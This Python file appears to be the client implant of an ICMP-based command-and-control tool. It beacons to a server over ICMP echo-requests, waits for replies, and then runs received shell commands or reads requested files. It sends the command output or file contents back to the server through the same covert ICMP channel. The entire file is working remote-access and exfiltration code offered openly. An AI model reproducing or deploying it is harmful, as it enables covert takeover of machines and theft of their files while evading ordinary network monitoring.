
from icmp_c2_modules import *



cond = 0

def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()
        


def send_beacon(addr,data):
    while cond == 0:
        pkt_send(dest=SERVER_ADR,data="beacon",icmp_type="echo-request",id_packet=BEACON)
        print("send beacon")
        time.sleep(5)
    

def parse_packet(packet):
    print("packet recieved")
    if  Raw in packet:
        global cond
        cond = 1
        print("cond changed to " + str(cond))
        type_packet = check_type(packet)
        data_recieved = extract_data(packet)
        if type_packet == RUN:
            pkt_send(SERVER_ADR,data_recieved,"echo-request",id_packet=BEGIN_OUTPUT)
            output = RunCommand(data_recieved)
            pkt_send(SERVER_ADR,output,"echo-request",id_packet=IN_TRANSFER)
            pkt_send(SERVER_ADR,"garbage","echo-request",id_packet=EF)
        elif type_packet == FILE:
            pkt_send(SERVER_ADR,data_recieved,"echo-request",id_packet=BEGIN_FILE)
            output = read_file(data_recieved)
            pkt_send(SERVER_ADR,output,"echo-request",id_packet=IN_TRANSFER)
            pkt_send(SERVER_ADR,"garbage","echo-request",id_packet=EF)

        cond = 0
        print("cond changed to " + str(cond))
        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter=ICMP_RESPONSE + " and host " + SERVER_ADR,handler=parse_packet)
    
signal.signal(signal.SIGINT, signal_handler)
beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
beacon_thread.start()

client_listen()